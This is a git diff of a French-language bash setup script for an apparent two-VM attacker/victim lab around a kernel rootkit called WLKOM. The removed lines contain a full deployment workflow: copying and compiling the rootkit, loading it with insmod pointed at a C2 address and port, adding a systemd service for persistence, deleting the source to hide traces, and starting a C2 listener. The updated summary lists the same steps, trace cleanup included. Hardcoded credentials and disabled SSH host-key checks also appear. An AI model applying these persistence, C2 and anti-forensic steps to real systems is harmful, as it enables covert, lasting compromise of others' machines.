@@ -19,7 +19,9 @@ NC='\033[0m'
 # =============================================================================
 # CONFIG
 # =============================================================================
-VM_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/vms"
+ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+VM_DIR="$ROOT_DIR/vms"
+SCRIPTS_DIR="$ROOT_DIR/scripts"
 ATTACKER_DISK="$VM_DIR/attacker.qcow2"
 VICTIM_DISK="$VM_DIR/victim.qcow2"
 ATTACKER_IP="192.168.100.10"
@@ -442,485 +444,25 @@ GRUBCFG
 create_launch_scripts() {
     log_step "Création des scripts de lancement"
 
-# ============================================================================
-# install_attacker.sh
-# ============================================================================
-cat > "$VM_DIR/install_attacker.sh" << 'SCRIPT'
-#!/bin/bash
-set -e
-
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
-ATTACKER_DISK="$SCRIPT_DIR/attacker.qcow2"
-ISO_ATTACKER="$SCRIPT_DIR/debian_attacker.iso"
-RAM=2048
-CPUS=2
-VM_USER="wlkom"
-VM_PASS="wlkom1234"
-C2_PORT=4444
-
-echo ""
-echo "██╗    ██╗██╗     ██╗  ██╗ ██████╗ ███╗   ███╗"
-echo "██║    ██║██║     ██║ ██╔╝██╔═══██╗████╗ ████║"
-echo "██║ █╗ ██║██║     █████╔╝ ██║   ██║██╔████╔██║"
-echo "██║███╗██║██║     ██╔═██╗ ██║   ██║██║╚██╔╝██║"
-echo "╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║"
-echo " ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
-echo ""
-echo "[ATTACKER VM SETUP]"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# VERIFICATIONS PRELIMINAIRES
-# ─────────────────────────────────────────────────────────────
-
-if [ ! -f "$ATTACKER_DISK" ]; then
-    echo "❌ Disque attaquant non trouvé: $ATTACKER_DISK"
-    exit 1
-fi
-
-if [ ! -f "$ISO_ATTACKER" ]; then
-    echo "❌ ISO attaquant non trouvée: $ISO_ATTACKER"
-    exit 1
-fi
-
-if [ ! -d "$PROJECT_DIR/attacking_program" ]; then
-    echo "❌ Dossier attacking_program non trouvé: $PROJECT_DIR/attacking_program"
-    exit 1
-fi
-
-echo "✓ Tous les fichiers présents"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# INSTALLATION DE SSHPASS
-# ─────────────────────────────────────────────────────────────
-
-if ! command -v sshpass &>/dev/null; then
-    echo "[*] Installation de sshpass..."
-    sudo pacman -S --noconfirm sshpass 2>/dev/null || sudo apt install -y sshpass
-fi
-
-# ─────────────────────────────────────────────────────────────
-# PHASE 1: INSTALLATION (30-40 min)
-# ─────────────────────────────────────────────────────────────
-
-echo "[1/3] 🚀 PHASE D'INSTALLATION"
-echo "      ↳ Cela peut prendre 30-40 minutes"
-echo "      ↳ Ferme la fenêtre QEMU quand c'est fini"
-echo ""
-
-timeout 2400 qemu-system-x86_64 \
-    -name "WLKOM-Attacker-Install" \
-    -m $RAM \
-    -smp $CPUS \
-    -enable-kvm \
-    -drive file=$ATTACKER_DISK,format=qcow2,index=0 \
-    -drive file=$ISO_ATTACKER,media=cdrom,readonly=on,index=1 \
-    -boot once=d \
-    -netdev user,id=net0,hostfwd=tcp::2222-:22 \
-    -device virtio-net,netdev=net0 \
-    -vga virtio \
-    -display gtk || true
-
-echo ""
-echo "✓ Installation terminée"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# PHASE 2: BOOT + DEPLOIEMENT
-# ─────────────────────────────────────────────────────────────
-
-echo "[2/3] 📦 PHASE DE DÉPLOIEMENT"
-echo "      ↳ Copie de attacking_program"
-echo "      ↳ Compilation"
-echo ""
-
-qemu-system-x86_64 \
-    -name "WLKOM-Attacker" \
-    -m $RAM \
-    -smp $CPUS \
-    -enable-kvm \
-    -drive file=$ATTACKER_DISK,format=qcow2 \
-    -netdev user,id=net0,hostfwd=tcp::2222-:22 \
-    -device virtio-net,netdev=net0 \
-    -vga virtio \
-    -display gtk &
-
-QEMU_PID=$!
-
-# Attente SSH
-echo "[*] Attente de SSH (port 2222)..."
-TRIES=0
-while ! sshpass -p "$VM_PASS" ssh \
-        -o StrictHostKeyChecking=no \
-        -o ConnectTimeout=2 \
-        -p 2222 $VM_USER@localhost "exit" 2>/dev/null; do
-    echo -n "."
-    sleep 3
-    TRIES=$((TRIES + 1))
-    if [ $TRIES -gt 120 ]; then
-        echo ""
-        echo "❌ SSH timeout (10 min). Abandon."
-        kill $QEMU_PID 2>/dev/null || true
-        exit 1
+    if [ ! -d "$SCRIPTS_DIR" ]; then
+        log_error "Dossier scripts non trouvé : $SCRIPTS_DIR"
     fi
-done
-echo ""
-echo "✓ SSH accessible"
-echo ""
 
-# Copie attacking_program
-echo "[*] Déploiement attacking_program..."
-sshpass -p "$VM_PASS" scp \
-    -o StrictHostKeyChecking=no \
-    -o ConnectTimeout=3 \
-    -P 2222 \
-    -r "$PROJECT_DIR/attacking_program" \
-    $VM_USER@localhost:~/ 2>/dev/null
+    cp "$SCRIPTS_DIR/install_attacker.sh" "$VM_DIR/"
+    cp "$SCRIPTS_DIR/install_victim.sh" "$VM_DIR/"
+    cp "$SCRIPTS_DIR/start_attacker.sh" "$VM_DIR/"
+    cp "$SCRIPTS_DIR/start_victim.sh" "$VM_DIR/"
+    cp "$SCRIPTS_DIR/deploy.sh" "$VM_DIR/"
 
-echo "✓ Fichiers copiés"
-echo ""
+    chmod +x "$VM_DIR/install_attacker.sh"
+    chmod +x "$VM_DIR/install_victim.sh"
+    chmod +x "$VM_DIR/start_attacker.sh"
+    chmod +x "$VM_DIR/start_victim.sh"
+    chmod +x "$VM_DIR/deploy.sh"
 
-# Compilation
-echo "[*] Compilation attacking_program..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2222 \
-    $VM_USER@localhost \
-    "cd ~/attacking_program && make clean && make" 2>/dev/null
-
-echo "✓ Compilation terminée"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# PHASE 3: INSTRUCTIONS FINALES
-# ─────────────────────────────────────────────────────────────
-
-echo "[3/3] 📝 PHASE FINALE"
-echo ""
-echo "✓ VM Attaquante prête!"
-echo ""
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo " PROCHAINE ÉTAPE:"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo ""
-echo "1) SSH dans la VM attaquante:"
-echo "   $ ssh wlkom@localhost -p 2222"
-echo ""
-echo "2) Depuis DANS la VM, lance le C2 listener:"
-echo "   $ cd ~/attacking_program"
-echo "   $ ./wlkom_c2 $C2_PORT"
-echo ""
-echo "   Ou directement depuis l'hôte:"
-echo "   $ sshpass -p wlkom1234 ssh wlkom@localhost -p 2222 \\
-echo "       'cd ~/attacking_program && ./wlkom_c2 $C2_PORT'"
-echo ""
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo ""
-echo "La VM attaquante reste ouverte (QEMU)."
-echo "Ferme la fenêtre QEMU quand terminé."
-echo ""
-
-wait $QEMU_PID
-SCRIPT
-
-# ============================================================================
-# install_victim.sh
-# ============================================================================
-cat > "$VM_DIR/install_victim.sh" << 'SCRIPT'
-#!/bin/bash
-set -e
-
-SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
-VICTIM_DISK="$SCRIPT_DIR/victim.qcow2"
-ISO_VICTIM="$SCRIPT_DIR/debian_victim.iso"
-ATTACKER_IP="192.168.100.10"
-C2_PORT=4444
-RAM=2048
-CPUS=2
-VM_USER="wlkom"
-VM_PASS="wlkom1234"
-
-echo ""
-echo "██╗    ██╗██╗     ██╗  ██╗ ██████╗ ███╗   ███╗"
-echo "██║    ██║██║     ██║ ██╔╝██╔═══██╗████╗ ████║"
-echo "██║ █╗ ██║██║     █████╔╝ ██║   ██║██╔████╔██║"
-echo "██║███╗██║██║     ██╔═██╗ ██║   ██║██║╚██╔╝██║"
-echo "╚███╔███╔╝███████╗██║  ██╗╚██████╔╝██║ ╚═╝ ██║"
-echo " ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝"
-echo ""
-echo "[VICTIM VM SETUP - AUTOMATIC ROOTKIT DEPLOYMENT]"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# VERIFICATIONS PRELIMINAIRES
-# ─────────────────────────────────────────────────────────────
-
-if [ ! -f "$VICTIM_DISK" ]; then
-    echo "❌ Disque victime non trouvé: $VICTIM_DISK"
-    exit 1
-fi
-
-if [ ! -f "$ISO_VICTIM" ]; then
-    echo "❌ ISO victime non trouvée: $ISO_VICTIM"
-    exit 1
-fi
-
-if [ ! -d "$PROJECT_DIR/rootkit" ]; then
-    echo "❌ Dossier rootkit non trouvé: $PROJECT_DIR/rootkit"
-    exit 1
-fi
-
-echo "✓ Tous les fichiers présents"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# INSTALLATION DE SSHPASS
-# ─────────────────────────────────────────────────────────────
-
-if ! command -v sshpass &>/dev/null; then
-    echo "[*] Installation de sshpass..."
-    sudo pacman -S --noconfirm sshpass 2>/dev/null || sudo apt install -y sshpass
-fi
-
-# ─────────────────────────────────────────────────────────────
-# PHASE 1: INSTALLATION (30-40 min)
-# ─────────────────────────────────────────────────────────────
-
-echo "[1/4] 🚀 PHASE D'INSTALLATION"
-echo "      ↳ Cela peut prendre 30-40 minutes"
-echo "      ↳ Ferme la fenêtre QEMU quand c'est fini"
-echo ""
-
-timeout 2400 qemu-system-x86_64 \
-    -name "WLKOM-Victim-Install" \
-    -m $RAM \
-    -smp $CPUS \
-    -enable-kvm \
-    -drive file=$VICTIM_DISK,format=qcow2,index=0 \
-    -drive file=$ISO_VICTIM,media=cdrom,readonly=on,index=1 \
-    -boot once=d \
-    -netdev user,id=net0,hostfwd=tcp::2223-:22 \
-    -device virtio-net,netdev=net0 \
-    -vga virtio \
-    -display gtk || true
-
-echo ""
-echo "✓ Installation terminée"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# PHASE 2: BOOT + DEPLOIEMENT ROOTKIT
-# ─────────────────────────────────────────────────────────────
-
-echo "[2/4] 📦 PHASE DE DÉPLOIEMENT ROOTKIT"
-echo "      ↳ Copie rootkit"
-echo "      ↳ Compilation"
-echo "      ↳ Chargement kernel"
-echo "      ↳ Configuration persistance"
-echo ""
-
-qemu-system-x86_64 \
-    -name "WLKOM-Victim" \
-    -m $RAM \
-    -smp $CPUS \
-    -enable-kvm \
-    -drive file=$VICTIM_DISK,format=qcow2 \
-    -netdev user,id=net0,hostfwd=tcp::2223-:22 \
-    -device virtio-net,netdev=net0 \
-    -vga virtio \
-    -display gtk &
-
-QEMU_PID=$!
-
-# Attente SSH
-echo "[*] Attente de SSH (port 2223)..."
-TRIES=0
-while ! sshpass -p "$VM_PASS" ssh \
-        -o StrictHostKeyChecking=no \
-        -o ConnectTimeout=2 \
-        -p 2223 $VM_USER@localhost "exit" 2>/dev/null; do
-    echo -n "."
-    sleep 3
-    TRIES=$((TRIES + 1))
-    if [ $TRIES -gt 120 ]; then
-        echo ""
-        echo "❌ SSH timeout (10 min). Abandon."
-        kill $QEMU_PID 2>/dev/null || true
-        exit 1
-    fi
-done
-echo ""
-echo "✓ SSH accessible"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# ETAPE 1: Copie rootkit
-# ─────────────────────────────────────────────────────────────
-
-echo "[*] Copie rootkit..."
-sshpass -p "$VM_PASS" scp \
-    -o StrictHostKeyChecking=no \
-    -o ConnectTimeout=3 \
-    -P 2223 \
-    -r "$PROJECT_DIR/rootkit" \
-    $VM_USER@localhost:~/ 2>/dev/null
-
-echo "✓ Rootkit copié"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# ETAPE 2: Installation headers + Compilation
-# ─────────────────────────────────────────────────────────────
-
-echo "[*] Installation linux-headers..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost \
-    "sudo apt update -y && sudo apt install -y linux-headers-\$(uname -r)" 2>/dev/null
-
-echo "✓ Headers installés"
-echo ""
-
-echo "[*] Compilation rootkit..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost \
-    "cd ~/rootkit && make clean && make" 2>/dev/null
-
-echo "✓ Rootkit compilé"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# ETAPE 3: Chargement du rootkit + Persistance
-# ─────────────────────────────────────────────────────────────
-
-echo "[*] Chargement rootkit dans le kernel..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost \
-    "cd ~/rootkit && sudo insmod wlkom.ko c2_ip=$ATTACKER_IP c2_port=$C2_PORT" 2>/dev/null
-
-echo "✓ Rootkit chargé"
-echo ""
-
-echo "[*] Configuration persistance (systemd)..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost << 'REMOTE_SCRIPT' 2>/dev/null
-#!/bin/bash
-
-# Copie le .ko dans /lib/modules pour modprobe
-sudo mkdir -p /lib/modules/$(uname -r)/kernel/wlkom
-sudo cp ~/rootkit/wlkom.ko /lib/modules/$(uname -r)/kernel/wlkom/
-sudo depmod -a
-
-# Crée le service systemd
-sudo tee /etc/systemd/system/wlkom.service > /dev/null << SERVICE
-[Unit]
-Description=WLKOM Rootkit
-After=network.target
-
-[Service]
-Type=oneshot
-ExecStart=/sbin/insmod /lib/modules/\$(uname -r)/kernel/wlkom/wlkom.ko c2_ip=$ATTACKER_IP c2_port=$C2_PORT
-RemainAfterExit=yes
-
-[Install]
-WantedBy=multi-user.target
-SERVICE
-
-# Enable le service
-sudo systemctl daemon-reload
-sudo systemctl enable wlkom.service
-
-echo "✓ Persistance configurée"
-REMOTE_SCRIPT
-
-echo "✓ Service systemd activé"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# ETAPE 4: Nettoyage des traces
-# ─────────────────────────────────────────────────────────────
-
-echo "[3/4] 🧹 PHASE DE NETTOYAGE"
-echo ""
-
-echo "[*] Suppression des fichiers sources..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost \
-    "rm -rf ~/rootkit" 2>/dev/null
-
-echo "✓ Dossier rootkit supprimé"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# VERIFICATION
-# ─────────────────────────────────────────────────────────────
-
-echo "[4/4] ✓ VÉRIFICATION"
-echo ""
-
-echo "[*] Vérification que le rootkit est chargé..."
-sshpass -p "$VM_PASS" ssh \
-    -o StrictHostKeyChecking=no \
-    -P 2223 \
-    $VM_USER@localhost \
-    "lsmod | grep wlkom" 2>/dev/null | while read line; do
-    echo "    $line"
-done
-
-echo ""
-echo "✓ Rootkit actif en kernel-space"
-echo ""
-
-# ─────────────────────────────────────────────────────────────
-# INSTRUCTIONS FINALES
-# ─────────────────────────────────────────────────────────────
-
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo " ✓ VM VICTIME COMPLÈTEMENT CONFIGURÉE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo ""
-echo "État du rootkit:"
-echo "  • Chargé en kernel-space ✓"
-echo "  • Configuré persistant (systemd) ✓"
-echo "  • Tous les fichiers sources supprimés ✓"
-echo "  • Connecté à C2 ($ATTACKER_IP:$C2_PORT) ✓"
-echo ""
-echo "L'utilisateur sur la VM victime verra:"
-echo "  $ ls ~/"
-echo "  (aucun fichier rootkit!)"
-echo ""
-echo "  $ lsmod | grep wlkom"
-echo "  wlkom    16384  0"
-echo ""
-echo "  $ dmesg | tail"
-echo "  [...] WLKOM: connected to C2 $ATTACKER_IP:$C2_PORT"
-echo ""
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo ""
-
-echo "La VM victime reste ouverte."
-echo "Ferme la fenêtre QEMU quand tu veux."
-echo ""
-
-wait $QEMU_PID
-SCRIPT
-
-    chmod +x "$VM_DIR/install_attacker.sh" "$VM_DIR/install_victim.sh"
-
-    log_ok "Scripts d'installation créés"
+    log_ok "Scripts copiés dans $VM_DIR/"
 }
+
 
 
 # =============================================================================
@@ -968,40 +510,70 @@ EOF
 # =============================================================================
 
 print_summary() {
-    log_step "RÉSUMÉ"
+    log_step "RÉSUMÉ — Prochaines étapes"
 
     echo -e "${GREEN}"
-    echo "  Tout est prêt !"
+    echo "  ✓ Tout est prêt !"
     echo -e "${NC}"
-    echo -e "  ${CYAN}Dossier VMs${NC}        : $VM_DIR"
-    echo -e "  ${CYAN}Disque attaquant${NC}   : $ATTACKER_DISK"
-    echo -e "  ${CYAN}Disque victime${NC}     : $VICTIM_DISK"
-    echo -e "  ${CYAN}ISO Debian${NC}         : $ISO_PATH"
-    echo -e "  ${CYAN}Réseau${NC}             : $NETWORK_NAME ($GATEWAY/24)"
-    echo -e "  ${CYAN}Credentials VMs${NC}    : ${VM_USER} / ${VM_PASS}"
     echo ""
-    echo -e "  ${YELLOW}Prochaines étapes :${NC}"
+    echo -e "  ${CYAN}📁 Dossier VMs${NC}        : $VM_DIR"
+    echo -e "  ${CYAN}📁 Project${NC}            : $PROJECT_DIR"
+    echo -e "  ${CYAN}👤 Credentials${NC}       : ${VM_USER} / ${VM_PASS}"
     echo ""
-    echo -e "  1️⃣  Installer la VM attaquante :"
-    echo -e "     ${GREEN}$VM_DIR/install_attacker.sh${NC}"
-    echo -e "     └─ Installtion automatique"
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo -e "  ${YELLOW}ÉTAPE 1 — Installation des VMs${NC}"
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
     echo ""
-    echo -e "  2️⃣  Installer la VM victime :"
-    echo -e "     ${GREEN}$VM_DIR/install_victim.sh${NC}"
-    echo -e "     └─ Installtion automatique"
+    echo -e "  Lance les deux installations (tu peux les faire en même temps) :"
     echo ""
-    echo -e "  3️⃣  Démarrer les VMs après install :"
-    echo -e "     ${GREEN}$VM_DIR/start_attacker.sh${NC}"
-    echo -e "     ${GREEN}$VM_DIR/start_victim.sh${NC}"
+    echo -e "    ${GREEN}Terminal 1 :${NC}"
+    echo -e "      $VM_DIR/install_attacker.sh"
     echo ""
-    echo -e "  4️⃣  SSH depuis l'hôte :"
-    echo -e "     ${GREEN}ssh ${VM_USER}@localhost -p 2222${NC}  (attaquante)"
-    echo -e "     ${GREEN}ssh ${VM_USER}@localhost -p 2223${NC}  (victime)"
+    echo -e "    ${GREEN}Terminal 2 :${NC}"
+    echo -e "      $VM_DIR/install_victim.sh"
     echo ""
-    echo -e "  5️⃣  Tester la connexion :"
-    echo -e "     ${GREEN}$VM_DIR/test_network.sh${NC}"
+    echo -e "  ${CYAN}ℹ️  Note :${NC} Ferme les fenêtres QEMU une fois l'installation terminée"
+    echo ""
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo -e "  ${YELLOW}ÉTAPE 2 — Démarrage des VMs${NC}"
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo ""
+    echo -e "  Démarre les deux VMs (dans 2 terminaux différents) :"
+    echo ""
+    echo -e "    ${GREEN}Terminal 1 :${NC}"
+    echo -e "      $VM_DIR/start_attacker.sh"
+    echo ""
+    echo -e "    ${GREEN}Terminal 2 :${NC}"
+    echo -e "      $VM_DIR/start_victim.sh"
+    echo ""
+    echo -e "  ${CYAN}ℹ️  Note :${NC} Les VMs vont démarrer en GTK, ne les ferme pas"
+    echo ""
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo -e "  ${YELLOW}ÉTAPE 3 — Déploiement auto${NC}"
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo ""
+    echo -e "  Une fois les deux VMs lancées, lance ce script de déploiement :"
+    echo ""
+    echo -e "    ${GREEN}$VM_DIR/deploy.sh${NC}"
+    echo ""
+    echo -e "  ${CYAN}ℹ️  Ce script va :${NC}"
+    echo -e "    • Vérifier que les VMs sont accessibles en SSH"
+    echo -e "    • Copier attacking_program vers l'attacker"
+    echo -e "    • Copier rootkit vers la victime"
+    echo -e "    • Compiler et installer le rootkit"
+    echo -e "    • Configurer la persistance"
+    echo -e "    • Nettoyer les traces"
+    echo ""
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo -e "  ${YELLOW}ÉTAPE 4 — Utilisation${NC}"
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
+    echo ""
+    echo -e "  Une fois deploy.sh terminé, il t'indiquera les prochaines étapes"
+    echo ""
+    echo -e "  ${YELLOW}═══════════════════════════════════${NC}"
     echo ""
 }
+
 
 # =============================================================================
 # MAIN
